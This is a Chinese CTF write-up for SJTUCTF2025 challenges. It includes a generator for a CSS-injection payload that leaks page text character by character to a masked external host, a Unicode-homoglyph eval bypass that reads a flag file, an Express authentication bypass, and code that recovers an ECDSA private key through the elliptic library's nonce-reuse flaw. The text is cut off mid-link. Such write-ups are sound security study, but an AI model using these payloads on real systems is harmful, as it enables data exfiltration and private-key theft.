---
title: SJTUCTF2025 Writeup (2)
date: 2025-04-07T01:21:48+08:00
tags:
mathjax: true
---
观前提示：本Writeup含有过量Deepseek The Flag的内容，建议谨慎观看

# Gradient

> 快来挑选你喜欢的渐变色吧！

原题，秒了：[[Web Exploitation] Exfiltration via CSS Injection | tripoloski blog](https://tripoloski1337.github.io/webex/2024/07/24/exfil-using-only-css.html)

你怎么知道我赛前刚读过这篇文章。

```js
const host="http://*.*.*.*:*";
const fs=require("fs")

let cs = " red,red);}"
for(let i=0;i<50;i++){
for(let j=0;j<256;j++){
  cs +=  `@font-face {font-family: fuckyou-${i};  src:url("${host}/leak+${i}+${j}");unicode-range:U+${j.toString(16)};}`
}
cs+= `span:nth-child(${i}){font-family:fuckyou-${i}}`
}

cs+="*{width:calc(1"
fs.writeFileSync("payload",cs)
```

结果：`48 111 112 115 123 85 53 101 95 36 116 116 70 125`

`0ops{U5e_$ttF}`


# PyCalc

```python
#!/usr/bin/env python3

from flask import Flask, request, jsonify
from flask import render_template

app = Flask(__name__)

@app.route('/calc', methods=['GET'])
def calculate():
    expression = request.args.get('expr')
  
    if not expression:
        return jsonify({"error": "No expression provided"}), 400
  
    for n in range(26):
        if (chr(n + 65) in expression or chr(n + 97) in expression):
            return jsonify({"error": "No letters allowed"}), 400
  
    for n in "!\"#$%&',:;<=>?@[\]^_`{|}~":
        if n in expression:
            return jsonify({"error": "No special characters allowed"}), 400
  
    try:
        result = eval(expression)
        return jsonify({"result": result})
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
```

See also: [ZJUCTF 2024 官方部分题解 | Xecades Notes](https://note.xecades.xyz/ctf/game/zjuctf2024#3)

refer: [PEP 672 – Unicode-related Security Considerations for Python | peps.python.org](https://peps.python.org/pep-0672/)

tool: [Instagram Fonts Generator (𝓬𝓸𝓹𝔂 𝕒𝕟𝕕 𝓅𝒶𝓈𝓉𝑒) ― IGFonts.io](https://igfonts.io/)

payload: `𝖊𝖛𝖆𝖑(𝖈𝖍𝖗(111)+𝖈𝖍𝖗(112)+𝖈𝖍𝖗(101)+𝖈𝖍𝖗(110)+𝖈𝖍𝖗(40)+𝖈𝖍𝖗(34)+𝖈𝖍𝖗(46)+𝖈𝖍𝖗(46)+𝖈𝖍𝖗(47)+𝖈𝖍𝖗(102)+𝖈𝖍𝖗(108)+𝖈𝖍𝖗(97)+𝖈𝖍𝖗(103)+𝖈𝖍𝖗(34)+𝖈𝖍𝖗(41)+𝖈𝖍𝖗(46)+𝖈𝖍𝖗(114)+𝖈𝖍𝖗(101)+𝖈𝖍𝖗(97)+𝖈𝖍𝖗(100)+𝖈𝖍𝖗(40)+𝖈𝖍𝖗(41))  # open("../flag").read()`



# 女娲补胎

> 你的程序是好程序，但是没有：祝融引擎、瀛洲存储、甲骨文识别、貔貅缓存、铜雀加密、建木通信、蓬莱界面、息壤渲染、河图密码、归墟哈希、三神兽防御……

```js
const Zhu_Rong = require('express'); //祝融引擎
const Ying_Zhou = require('path'); //瀛洲存储
const Oracle = require('cookie-parser'); //甲骨文识别
const Pi_Xiu = require('express-session'); //貔貅缓存
const Tong_Que = require("crypto"); //铜雀加密
const Jian_Mu = 3000; //建木通信
const Peng_Lai = "views" //蓬莱界面
const Xi_Rang = "view engine" //息壤渲染
const He_Tu = "12345678910" //河图密码

const zhu_Rong = Zhu_Rong();

zhu_Rong.set(Xi_Rang, 'ejs');
zhu_Rong.set(Peng_Lai, Ying_Zhou.join(__dirname, Peng_Lai));

zhu_Rong.use(Zhu_Rong.urlencoded({ extended: true }));
zhu_Rong.use(Oracle());

zhu_Rong.use(Zhu_Rong.static(Ying_Zhou.join(__dirname)));
zhu_Rong.use(Pi_Xiu({
  resave: false,
  saveUninitialized: false,
  secret: Tong_Que.randomBytes(32).toString("hex")
}));

//归墟哈希
function Gui_Xu(str) {
  const hash = Tong_Que.createHash('md5');
  hash.update(str);
  return hash.digest('hex');
}

//神兽「玄武」以甲壳御侮、以鳞角擅战
function Xuan_Wu(req) { 
  if (req.header['admin_key'] != undefined)
  if (Gui_Xu(req.header['admin_key']) == "81cb271f0e52999ba6a0fb11fa6dd9fd")
  return "pass"; return "fail";
}

//神鸟「重明」双目双瞳可辨妖邪
function Double_Pupil(req) { 
  return (req.session.user == "admin")
  && (req.session.logined == "true");
}

//独脚神兽「夔」借雷声震慑天下
function Kui_Dragon(req) { 
  return req.cookies['role'] == "admin";
}

zhu_Rong.get('/', (req, res) => {
  const error = req.session.error;
  delete req.session.error;
  res.render('index', { error });
});

function Triple_Secure(req, res, next) {
  if (!Xuan_Wu(req)) {
    res.redirect('/');
  }
  else if (!Double_Pupil(req)) {
    res.redirect('/');
  }
  else if (!Kui_Dragon(req)) {
    res.redirect('/');
  }
  else {
    next();
  }
}

zhu_Rong.get('/flag', Triple_Secure, (req, res) => {
  const flag = process.env.FLAG ?? 'flag{test}';
  res.render('flag', { flag });
});

zhu_Rong.post('/', (req, res) => {
  const { username, password } = req.body;
  if (username === 'admin' && password === He_Tu) {
    res.cookie('role', 'user', {
      httpOnly: true,
      maxAge: 3600000,
      sameSite: 'strict'
    });

    req.session.user = username;
    req.session.logined = "true";
    return res.redirect('/flag');
  }
  
  req.session.error = '登录失败';
  res.redirect('/');
});

zhu_Rong.listen(Jian_Mu, () => {
  console.log(`Server running at http://localhost:${Jian_Mu}`);
});
```

有点过于幽默了我们先还原成正常的应用

```js
const express = require('express'); //祝融引擎
const path = require('path'); //瀛洲存储
const cookieParser = require('cookie-parser'); //甲骨文识别
const expressSession = require('express-session'); //貔貅缓存
const crypto = require("crypto"); //铜雀加密
const port = 3010; //建木通信
const He_Tu = "12345678910" //河图密码

const app = express();

app.set("view engine", 'ejs');
app.set("views", path.join(__dirname, "views"));

app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

app.use(express.static(path.join(__dirname)));
app.use(expressSession({
  resave: false,
  saveUninitialized: false,
  secret: crypto.randomBytes(32).toString("hex")
}));

function md5(str) {
  const hash = crypto.createHash('md5');
  hash.update(str);
  return hash.digest('hex');
}

function Xuan_Wu(req) { 
  if (req.header['admin_key'] != undefined)
  if (md5(req.header['admin_key']) == "81cb271f0e52999ba6a0fb11fa6dd9fd")
  return "pass"; return "fail";
}

function Double_Pupil(req) { 
  return (req.session.user == "admin")
  && (req.session.logined == "true");
}

function Kui_Dragon(req) { 
  return req.cookies['role'] == "admin";
}

app.get('/', (req, res) => {
  const error = req.session.error;
  delete req.session.error;
  res.render('index', { error });
});

function Triple_Secure(req, res, next) {
  console.log(Xuan_Wu(req),Double_Pupil(req),Kui_Dragon(req))
  if (!Xuan_Wu(req)) {
    res.redirect('/');  // <-- Always OK
  }
  else if (!Double_Pupil(req)) {
    res.redirect('/');
  }
  else if (!Kui_Dragon(req)) {
    res.redirect('/');   // <-- Its easy
  }
  else {
    next();
  }
}

app.get('/flag', Triple_Secure, (req, res) => {
  const flag = process.env.FLAG ?? 'flag{test}';
  res.render('flag', { flag });
});

app.post('/', (req, res) => {
  const { username, password } = req.body;
  console.log(username,password);
  console.log(req.session.user);
  
  
  if (username === 'admin' && password === He_Tu) {
    res.cookie('role', 'user', {
      httpOnly: true,
      maxAge: 3600000,
      sameSite: 'strict'
    });

    req.session.user = username;
    req.session.logined = "true";
    return res.redirect('/flag');
  }
  
  req.session.error = '登录失败';
  res.redirect('/');
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
```

OK我们来过一下这三个check：

```js
function Xuan_Wu(req) { 
  if (req.header['admin_key'] != undefined)
  if (md5(req.header['admin_key']) == "81cb271f0e52999ba6a0fb11fa6dd9fd")
  return "pass"; return "fail";
}
```

无论是`"pass"`还是`"fail"`都是truthy value所以这个可以直接过

```js
function Kui_Dragon(req) { 
  return req.cookies['role'] == "admin";
}
```

这个也好办，直接改cookie就行

```js
function Double_Pupil(req) { 
  return (req.session.user == "admin")
  && (req.session.logined == "true");
}
```

直接上`GET /app.js`可以拿到更新后的密码，就可以正常登录然后拿到admin session了

然后访问`/flag`拿到flag


# KillerECC

> I’ve crafted a killer signer—anything you want signed, consider it done. It is the strongest in the world. No limits, no questions.

又到了我最爱的Node.js时间了

查阅Dockerfile发现

```dockerfile
RUN npm install elliptic@6.6.0
```

欸，怎么还锁版本的？事出反常必有妖，直接前往Github查看版本更新了什么

[Private key extraction in ECDSA upon signing a malformed input (e.g. a string) · Advisory · indutny/elliptic](https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh)

Affected versions ：<=6.6.0

Patched versions ： =6.6.1

难怪锁版本

Deepseek Time!

> 阅读以下文章，请你补全full attack中funny函数和extract函数。
>
> Summary
> Private key can be extracted from ECDSA signature upon signing a malformed input (e.g. a string or a number), which could e.g. come from JSON network input
>
> Note that elliptic by design accepts hex strings as one of the possible input types
>
> Details
> In this code:
>
> elliptic/lib/elliptic/ec/index.js
>
> Lines 100 to 107 in 3e46a48
>
> ```js
>  msg = this._truncateToN(new BN(msg, 16)); 
>   
>  // Zero-extend key to provide enough entropy 
>  var bytes = this.n.byteLength(); 
>  var bkey = key.getPrivate().toArray('be', bytes); 
>   
>  // Zero-extend nonce to have the same byte size as N 
>  var nonce = msg.toArray('be', bytes); 
> ```
>
> msg is a BN instance after conversion, but nonce is an array, and different BN instances could generate equivalent arrays after conversion.
>
> Meaning that a same nonce could be generated for different messages used in signing process, leading to k reuse, leading to private key extraction from a pair of signatures
>
> Such a message can be constructed for any already known message/signature pair, meaning that the attack needs only a single malicious message being signed for a full key extraction
>
> While signing unverified attacker-controlled messages would be problematic itself (and exploitation of this needs such a scenario), signing a single message still should not leak the private key
>
> Also, message validation could have the same bug (out of scope for this report, but could be possible in some situations), which makes this attack more likely when used in a chain
>
> PoC
> k reuse example
>
> ```js
> import elliptic from 'elliptic'
>
> const { ec: EC } = elliptic
>
> const privateKey = crypto.getRandomValues(new Uint8Array(32))
> const curve = 'ed25519' // or any other curve, e.g. secp256k1
> const ec = new EC(curve)
> const prettyprint = ({ r, s }) => `r: ${r}, s: ${s}`
> const sig0 = prettyprint(ec.sign(Buffer.alloc(32, 1), privateKey)) // array of ones
> const sig1 = prettyprint(ec.sign('01'.repeat(32), privateKey)) // same message in hex form
> const sig2 = prettyprint(ec.sign('-' + '01'.repeat(32), privateKey)) // same `r`, different `s`
> console.log({ sig0, sig1, sig2 })
> ```
>
> Full attack
> This doesn't include code for generation/recovery on a purpose (bit it's rather trivial)
>
> ```js
> import elliptic from 'elliptic'
>
> const { ec: EC } = elliptic
>
> const privateKey = crypto.getRandomValues(new Uint8Array(32))
> const curve = 'secp256k1' // or any other curve, e.g. ed25519
> const ec = new EC(curve)
>
> // Any message, e.g. previously known signature
> const msg0 = crypto.getRandomValues(new Uint8Array(32))
> const sig0 = ec.sign(msg0, privateKey)
>
> // Attack
> const msg1 = funny(msg0) // this is a string here, but can also be of other non-Uint8Array types
> const sig1 = ec.sign(msg1, privateKey)
>
> const something = extract(msg0, sig0, sig1, curve)
>
> console.log('Curve:', curve)
> console.log('Typeof:', typeof msg1)
> console.log('Keys equal?', Buffer.from(privateKey).toString('hex') === something)
> const rnd = crypto.getRandomValues(new Uint8Array(32))
> const st = (x) => JSON.stringify(x)
> console.log('Keys equivalent?', st(ec.sign(rnd, something).toDER()) === st(ec.sign(rnd, privateKey).toDER()))
> console.log('Orig key:', Buffer.from(privateKey).toString('hex'))
> console.log('Restored:', something)
> ```
>
> Output:
>
> ```
> Curve: secp256k1
> Typeof: string
> Keys equal? true
> Keys equivalent? true
> Orig key: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a
> Restored: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a
> ```
>
> Similar for ed25519, but due to low n, the key might not match precisely but is nevertheless equivalent for signing:
>
> ```
> Curve: ed25519
> Typeof: string
> Keys equal? false
> Keys equivalent? true
> Orig key: f1ce0e4395592f4de24f6423099e022925ad5d2d7039b614aaffdbb194a0d189
> Restored: 01ce0e4395592f4de24f6423099e0227ec9cb921e3b7858581ec0d26223966a6
> restored is equal to orig mod N.
> ```

deepseek就这点好，虽然我完全不会密码学，但它会啊

以下代码其实是我在deepseek基础上缝缝补补的，但核心那个又mul又mod又sub的地方确实是我动不了一点的

但我首杀了欸（

```js
import elliptic from 'elliptic'

const { ec: EC } = elliptic
import BN from 'bn.js'
// import * as BN from 'bn.js'

const privateKey = crypto.getRandomValues(new Uint8Array(32))
const curve = 'secp256k1' // or any other curve, e.g. secp256k1
const ec = new EC(curve)
const prettyprint = ({ r, s }) => `r: ${r}, s: ${s}`
// const sig0 = prettyprint(ec.sign(Buffer.alloc(32, 1), privateKey)) // array of ones
// const sig1 = prettyprint(ec.sign('01'.repeat(32), privateKey)) // same message in hex form
// const sig2 = prettyprint(ec.sign('-' + '01'.repeat(32), privateKey)) // same `r`, different `s`
// console.log({ sig0, sig1, sig2 })

const msg1 = 'message'
const msg2 = '-message'

function _truncateToN(msg, truncOnly, bitLength) {
  var byteLength;
  if (BN.isBN(msg) || typeof msg === 'number') {
    msg = new BN(msg, 16);
    byteLength = msg.byteLength();
  } else if (typeof msg === 'object') {
    // BN assumes an array-like input and asserts length
    byteLength = msg.length;
    msg = new BN(msg, 16);
  } else {
    // BN converts the value to string
    var str = msg.toString();
    // HEX encoding
    byteLength = (str.length + 1) >>> 1;
    msg = new BN(str, 16);
  }
  // Allow overriding
  if (typeof bitLength !== 'number') {
    bitLength = byteLength * 8;
  }
  var delta = bitLength - 256;
  if (delta > 0)
    msg = msg.ushrn(delta);
  if (!truncOnly && msg.cmp(ec.n) >= 0)
    return msg.sub(ec.n);
  else
    return msg;
};

function extract(msg0, sig0, sig1, curve) {
    const ec = new EC(curve);
    const n = ec.curve.n; // 获取椭圆曲线阶数
  
    // 计算消息哈希值（需模拟库的_truncateToN处理）
    const truncate = (msg) => {
        const hash = ec.hash().update(msg).digest();
        return new BN(hash).umod(n);
    };
  
    const m0 = _truncateToN(msg0,false);
    const m1 = _truncateToN('-'+(msg0),false); // 构造的畸形消息
  
    // 提取签名参数
    const r0 = new BN(sig0.r);
    const s0 = new BN(sig0.s);
    const s1 = new BN(sig1.s);

    // 计算k值（需处理负数情况）
    const sDiff = s0.sub(s1).umod(n);
    const mDiff = m0.sub(m1).umod(n);
    const k = mDiff.mul(sDiff.invm(n)).umod(n);

    // 计算私钥d = (s*k - m) * r^{-1} mod n
    const rInv = r0.invm(n);
    const d = s0.mul(k).sub(m0).mul(rInv).umod(n);
  
    // 转换为与原始私钥相同的存储格式
    return d.toArrayLike(Buffer, 'be', 32);
}

const sig1 = ec.sign(msg1, privateKey) // same message in hex form
console.log( sig1.r.toString(),sig1.s.toString() );

const sig2 = ec.sign(msg2, privateKey) // same `r`, different `s`
console.log(  sig2.r.toString(),sig2.s.toString()  );

const dd = extract(msg1,{
    r:sig1.r.toString(),
    s:sig1.s.toString()
},sig2,curve)

// console.log(dd,privateKey.toString());

const pj = extract("W3lc0mE_t0_5JTUCTF_H3rE_1s_tHe_Str0ngE5t_S1gNeR1c12dd9c180d7741",{
    r: "91426997419230525718509548937592264371316226642016660853420304857924344397242",
    s: "89695034389241702940008477355583313239384829620684977069286149588525124805327"
},{
    r: "91426997419230525718509548937592264371316226642016660853420304857924344397242",
    s: "85959227699333716494309208315324012194703816340313129828658767501041730306362"
},curve)

console.log(pj.toString('hex'))
```

deepseek对其中数学原理的分析

1. **funny函数设计**：
   • 通过构造前导零的十六进制字符串输入，利用BN库的自动截断特性（`toArray('be', bytes)`），使不同输入生成相同字节数组
   • 例如：`0x01`和`0x0001`在固定长度转换时都会生成`[0x01]`数组
   • 该设计直接触发nonce重复漏洞

2. **extract函数数学基础**：
   $$
   s_0 = k^{-1}(m_0 + dr) \mod n
   s_1 = k^{-1}(m_1 + dr) \mod n
   $$
   • 联立方程消去dr项：
   $$
   k = (m_0 - m_1)(s_0 - s_1)^{-1} \mod n
   d = (s_0k - m_0)r^{-1} \mod n
   $$
   • 需特别注意椭圆曲线参数的模运算处理


# TIME&POWER
> 我发现我的设备功耗出现了异常，似乎有人在爆破我的密码……但首先，我要先登录上我的账号。

相当明显的侧信道攻击emm但是感觉出的有点刻意了。

第一个爆密码 很好办直接出了`aaaaaaaadmin`

出来了一个numpy文件就是说每一位每一字符都有一个100个数的数据

拖到excel表里画个折线图，欸，还真有一条线在某一点显著偏离其余线

```python
import numpy as np

a=np.load("power.npy")

r="abcdefghijklmnopqrstuvwxyz0123456789_{}"

# cnt=0
# for u in a:
#     print(r[cnt%39],np.average(u))
#     cnt+=1
#     if cnt%39 ==0:
#         print("\n")


# print(len(a))
# pos=7
# with open("e.csv", "w") as f:
#     for i in range((pos)*39,(pos+1)*39):
#         f.write(r[i%39]+","+",".join([str((a[i][j])-9) for j in range(100)]))
#         f.write("\n")
# for i in range(39):
#     print("\t".join([str((a[i][j])) for j in range(100)]))
#     print("\n")


# def calculate_variance(arr):
#     mean = sum(arr) / len(arr)
#     variance = sum((x - mean) ​** 2 for x in arr) / len(arr)
#     return variance

def find_farthest_index(arr):
    mean = sum(arr) / len(arr)
    max_distance = -1
    farthest_index = 0
    for index, value in enumerate(arr):
        current_distance = abs(value - mean)
        if current_distance > max_distance:
            max_distance = current_distance
            farthest_index = index
    return farthest_index,max_distance

for pos in range(39):
    max_dis_max=-1
    max_dis_index=0
    for o in range(100):
        arr = [a[i][o] for i in range((pos)*39,(pos+1)*39)]
        fi,md=find_farthest_index(arr)
        if md>max_dis_max:
            max_dis_max=md
            max_dis_index=fi

        # print(r[(pos)*39+max_dis_index],arr[max_dis_index],max_dis_max)

    # print("max_dis_max",max_dis_max)
    print("max_dis_index",r[max_dis_index])


    """
max_dis_index 0
max_dis_index o
max_dis_index p
max_dis_index s
max_dis_index {
max_dis_index p
max_dis_index o
max_dis_index w
max_dis_index e
max_dis_index r
max_dis_index _
max_dis_index 1
max_dis_index s
max_dis_index _
max_dis_index a
max_dis_index 1
max_dis_index 1
max_dis_index _
max_dis_index y
max_dis_index 0
max_dis_index u
max_dis_index _
max_dis_index n
max_dis_index 5
max_dis_index 5
max_dis_index d
max_dis_index }

"""

        
"0ops{power_1s_a11_y0u_n55d}"
```

# ezCrypt

> This text looks suspiciously like Base64… but something’s not quite right. It seems a bit… compressed?

[1st Recipe](https://lab.tonycrane.cc/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Detect_File_Type(true,true,true,true,true,true,true)&input=SDRzSUFQZVN3V2NDLzdWYVcyNGNSd3o4OXlubUFFRlFkWUo4K0NScllHTUpWclNHSGpGOCt3VHJtZTZxSW1lMFVwRGtRL0RPVGovSVlyRklMaTdmbjM5YkhpNlhiOC9Mdy8yMzgvTGp2TnlkL2o0dnArWHBmSHA0K1BudnM4ZXZ5K1ByWDEvT1Q3OHZuMCtQeTgvTDYvTG4vZGZYcC9OeWVYMVpmdHlkWHBhWHUvdm41Zjc1ajArZndPdi9BSzkvZVAzTFgzK3hmblQ5ajV6ZkkvWHo3Y05mbjJ6UDUxOXV6MlU5ZWQvMngvamV0a2M5eC9yVzd2TnRQVUxQNGVjZFI5THpRaSsvblZ2ZUc5L2IxcWozWDk4N3VNOXEydGF1K24xZG4zN2VzVWpjYSs3ZmZyNGVyZDVIWHJubHZuditDaE1NLzM0RUgrNC92WmZ2aCtuY2FkUjFwMjI1emU3cis5TjI4dFNST1h5Nk9XdmJldnVtMko5emVWMTlQaDhycWIybUFjZDlOcytPZTdKY2h0VFY1dnZiNXJMQWFseGJmOFFhL0ROQ0RrYXhtOEoxTTRTR3IyS0RNNWJESTJNVlA1L2FzZHdQY3Y5aDE3eHorSThDeXJuZWRCbW5uWmorVS85dmRpTXR2alh5bVBoWDUrcDJOSDR6KzBnOFR4NkM4SSsreitxZkdkY285b0cvZjR4L1hVbTJ1Qm5maW1DMjd3ZUpEZmZSL0EvejM3d3ZlLzhHMVhYK29jZTM0VUg5QnlvLzl2N0R6RGZDWTRqMVVlMWphNW9QM041eVBzUEhYRStob2VjSmZIYjJSM3QvOHhmRW54Mis4cjZKajczNHNIaFMvOFVPRTErSlg5N0kzODM5T256STg4YitLaXdDN3pQZHFrOVIyTkw1QmFKRGRGMTNzbkxIY2Z6TmY5d1duNUsvd3Y0ZXY1VHJ3OUpNNUwveTc4UlA1UmZqcngzKzBmVWEvTmhGRzRsbThaNnBvTVdIR0R2alZ6aHBabUhQV0oxOWFWUWI4ZERpNy9qKzRZTGdQOEZuRTErdVh6cjg1ZjZzK0lEeGx5b3N3Vk81bnlVMll4QTAraW44Vy9EZjhibkZRT2p2NUJmZE5ha0VybDhDTkNXMyt2cGRma0dmSDF2L3AzMHp2ODExQWk5SWZVcnM0U2RTaE9zMzF2eXM4VlQwd1Z2NXQrUTNTMUVOZnBIOGs3ekhMditvQ0t6N2Qvd0k5UGcvemsreUh5cStib3V2SS8zaTlVV243eHovWkt1L29lbUtqZFlvK2MzdnY0dS9nL3paNlp2aFB3WWVlL3pmRkwrZFBwNXBtbUQ3SEdZL3JYVXNYL2Iyc1RSelVCODIvTGp6Zmg4L2lnNWZuOEN4dmdHNyt3bFFSdjBYKzN1K0wvZmZ6MCtnNnhOYWZRNTNvV0twc3o5TGZMdSs2dlhEdS9ESjIvQlBIT0h2UnZ6djZodEJmZWhBNjI4YzhJKzl2OGRQd1crOWZtVFB6MTYvdnV0K2lQN2IrL1dMOEp2MVA3eXZVL00vUDZ3UFduMjQ0MytMejlSM1IvWXgvemI5blR6dlBuNTcvYXFOcE1nL1ZaOTA5eWZmNHNmb1AyVDl3dy9XWi8rVlB6TmZxNXVLUFl2K25QNVhMdXowVzlXM1VmL3hJTDVLZkV0MXFQMlprY0JLdjlMYVlJbWg2MnVoRzJqMW10YnhWajhKTDY0SHJQV091VEt6RnpLUDJQdldHR2JaVjBPcitKWGF4OVgyTWFQUGFEMHVOV1l3bi9iUm5CbFYxVm4xUHZTa3FReXBEMFNnZWY4azZ2enNrd3FTbW5wTG13TmsyOE1Mc25iSERUdmxYR1E4a2Y2YTJSM3crcDVwbWRJcm5xc0txVnQrYW1zbkpyZ3NKenJkUmw4M2k1ZjAyNEN4OWhocGN5SVpnbEQ1QnpsUG1ZSTlCeHhaSjNYNEEyMHlJMzRWUXBobGkvVkxhVTFvK3JuanZwYmI1cGpGKzB6MCtCNndjVHk3RVFTMzlQNTVyWU90cm92N1p2T0VZK2VEOHhFbytiN0VoNHkxS3U2bi9hZWVpZmxGbTcvRWJ6R3ZpZGtFc3A3MldtendWdFNscUhQS3VJOWdSR0xTOUpMRzcvOFI1elFKZ2JZZnJMemFOS3k4TG9rK2tURXFST0JsdnhXaE04VWZqRHJBOUZIbUFlTUh3SHJLYW1hRm1pdTFiRFhZVUNzeWh5RlM1cFZlMHRQbU1hVTdpSngzYWw2UzVyL1VGL1ZzSTVwVVc3ay9vT25mZSswU2pkcmY5djRmZmJES2FLVFZPTGZ3aUx3SlhhZnlVNWtybWM1ditxNVZpcGU2RDBFMTlNb0NwZ3M5ai9sOGh1aDVJNmN4UGg4emdxUE5tNTFPQUorRENsaWpaVG4xcFlaKzlEcG9SQkg2Qm0yOGxmN09XL0hCTWxkQnRZTUhTdkd2cEJPZnh6VjROdTBsdnlaaEhHZ0t1eHJua29lZ2dlUDlpSXpMMU4xZFhHcGVjYjNqYWpDTG4vZ2xoTVdOejkycGM5V3MwWVhKeWR6WCs3VmJISFJ6Y0N1SlJjQms5dEdpbHRxZmpmeG15clhjTi9LNjRwMDVPNXQ1UVgrWFVmUXpZcDRlUUUzKzB5NWMxQ0hHOXhaanBoUHl2amJnaHNsTS8vMk51aVBtYTVyZll6NnBwUTlNZ0REelRad3ZKNXd1ZXpPdnFyQnE4clRzeDZMVGVNeTduaGVTNzBudjQrejROM1NlNERUbjFHR0xySnZSNTJlNlFzcEJxY1ZqMWkvSVVqZnpUSXVyZmpSZy9HM2tIdndzeHd6L1JoL1pBRWl5N1hkYWpqU2RGWHBONEZENjFvNnIrSkVCdmU4V1BLNHkwWFY3emlHNkFpZnRsd1E5cnZjUDN6YUV5MkVwQUFBPQ)

Decompress we get the output.

Output:

```plain
0ops, looks like we have a really long number. Can you figure out what this is?

010101000110100101101101011001010010000001110100011011110010000001100011011010000110111101101111011100110110010100100001001000000101010001101000011001010111001001100101001000000110000101110010011001010010000001110100011101110110111100100000......
```

[2nd Recipe](https://lab.tonycrane.cc/CyberChef/#recipe=From_Binary('None',8)&input=MDEwMTAxMDAwMTEwMTAwMTAxMTAxMTAxMDExMDAxMDEwMDEwMDAwMDAxMTEwMTAwMDExMDExMTEwMDEwMDAwMDAxMTAwMDExMDExMDEwMDAwMTEwMTExMTAxMTAxMTExMDExMTAwMTEwMTEwMDEwMTAwMTAwMDAxMDAxMDAwMDAwMTAxMDEwMDAxMTAxMDAwMDExMDAxMDEwMTExMDAxMDAxMTAwMTAxMDAxMDAwMDAwMTEwMDAwMTAxMTEwMDEwMDExMDAxMDEwMDEwMDAwMDAxMTEwMTAwMDExMTAxMTEwMTEwMTExMTAwMTAwMDAwMDExMDAwMTAwMTEwMTEwMDAxMTAxMTExMDExMDAwMTEwMTEwMTAxMTAxMTEwMDExMDAxMDAwMDAwMTEwMTExMTAxMTAwMTEwMDAxMDAwMDAwMTEwMDAxMTAxMTAxMDAxMDExMTAwMDAwMTEwMTAwMDAxMTAwMTAxMDExMTAwMTAwMDEwMTEwMDAwMTAwMDAwMDExMTAxMDAwMTEwMTAwMDAxMTAwMTAxMDAxMDAwMDAwMTEwMDExMDAxMTAxMTAwMDExMDAwMDEwMTEwMDExMTAwMTAwMDAwMDExMDEwMDEwMTExMDAxMTAwMTAwMDAwMDExMDEwMDEwMTEwMTExMDAwMTAwMDAwMDExMDExMTEwMTEwMTExMDAxMTAwMTAxMDAxMDAwMDAwMTEwMTExMTAxMTAwMTEwMDAxMDAwMDAwMTExMDEwMDAxMTAxMDAwMDExMDAxMDEwMTEwMTEwMTAwMTAxMTEwMDAxMDAwMDAwMTAwMDAxMTAxMTAxMDAwMDExMDExMTEwMTEwMTExMTAxMTEwMDExMDExMDAxMDEwMDEwMDAwMDAxMTEwMTExMDExMDEwMDEwMTExMDAxMTAxMTAwMTAxMDExMDExMDAwMTExMTAwMTAwMTAwMDAxMDAwMDEwMTAwMDAwMTAxMDAxMDEwMDEwMDAxMTAwMTEwMTAxMDExMDAxMTExMDAxMDEwMDEwMDEwMTAwMTAwMDAxMDAxMTEwMDAxMTAxMDEwMTEwMDAxMDAxMTAxMTEwMDEwMTAwMDEwMTEwMDExMTAxMTAwMTAwMDExMDExMDEwMTAxMTAwMTAxMTAwMTExMDEwMDExMDEwMTAwMTAwMDAxMTAwMTAwMDAxMTAxMDAwMTEwMDEwMTAxMDExMDAwMDExMTAwMTEwMTExMTAwMDAxMDEwMDAwMDEwMTAxMTEwMDExMDEwMTAwMTEwMTAwMDExMDAwMTEwMTEwMTEwMDAwMTExMDAxMDExMTEwMTAwMTEwMDEwMTAxMDEwMTAxMDEwMDAwMTAwMTAxMDEwMTAxMDExMDAwMDAxMTAwMTAwMTAwMTAxMDAxMDEwMTAwMDEwMTEwMDAwMDExMDAwMTAxMDAwMDEwMDEwMDAxMTAwMTEwMDAxMDAxMDAwMTAxMDEwMDExMTAwMTAwMTAwMDAxMDEwMDAxMDExMDExMDAwMDExMTAwMTAxMDEwMDAxMDExMDAxMDAwMTAxMDExMTAwMTEwMTAwMDExMTEwMDAwMTAwMTEwMTAxMDEwMDExMDEwMDAxMTAwMDExMTAwMTAxMDAxMDAxMDEwMTAwMTEwMTAwMDAxMDAxMDEwMTExMDEwMDEwMTAwMDExMDAxMTAxMTAxMTExMDExMDAxMTEwMTEwMDEwMTAxMDAxMDAwMDEwMTEwMTAwMTExMTAwMDAxMTAwMDExMDEwMTEwMDAwMTAxMTAxMDAxMTAxMDAwMDExMDAxMDAwMTAwMDAxMTAwMTEwMTAwMDExMDAxMTEwMTAxMDEwMDAxMTAxMTAxMDEwMDExMTAwMTEwMTEwMDAxMTAwMTAwMDExMDExMTAwMTEwMTAxMTAxMTAwMTExMDEwMTAxMDEwMDExMDAxMDAxMDAxMDEwMDExMDEwMDEwMTEwMDEwMTAxMDEwMDExMDEwMDAxMDEwMTEwMDExMTAxMDEwMDEwMDAxMTAwMTEwMTAxMDExMDAxMTExMDAxMDEwMTEwMTAwMTAxMTAwMDAxMDAxMDAxMDExMDAxMTEwMTEwMDEwMDAxMTAxMTAxMDEwMTEwMDEwMTEwMDExMTAxMDExMDAxMDEwMTAxMTEwMTAwMTAwMTAxMTAwMTExMDExMDAwMTEwMDExMDAxMTAxMTAxMTAwMDExMTAxMDEwMTEwMDEwMDAxMDAwMDExMDEwMDAwMTAwMDExMDAxMDAxMDExMDAxMDEwMTAwMTEwMTAwMDAxMDAxMTAxMTEwMDExMDAxMDAwMTAxMTAwMDAxMDExMDEwMDExMDExMDEwMTAwMTAwMTAxMDAwMTExMDEwMDEwMTAwMTEwMTAwMDAxMTAwMDExMDExMDExMTAwMDExMDEwMDAxMTAwMTExMDEwMTAxMDAwMDExMDAxMDAxMTAxMDAwMDExMDExMTAwMTAwMTAwMTAxMDAwMTEwMDEwMTEwMDEwMTEwMDExMTAxMTAwMDExMDEwMDAxMTEwMDExMDEwMTAxMTAxMDAwMDEwMDEwMDEwMTAwMDExMTAxMDAxMTEwMDExMDExMDAwMTAxMTAwMTAxMTAxMTAxMDExMDExMDAwMDExMDAxMDAxMTAwMDExMDEwMTEwMDAwMTAwMTAwMTAxMTAwMTExMDExMDAwMTAwMTAwMDExMTAxMDAxMDEwMDExMDExMTEw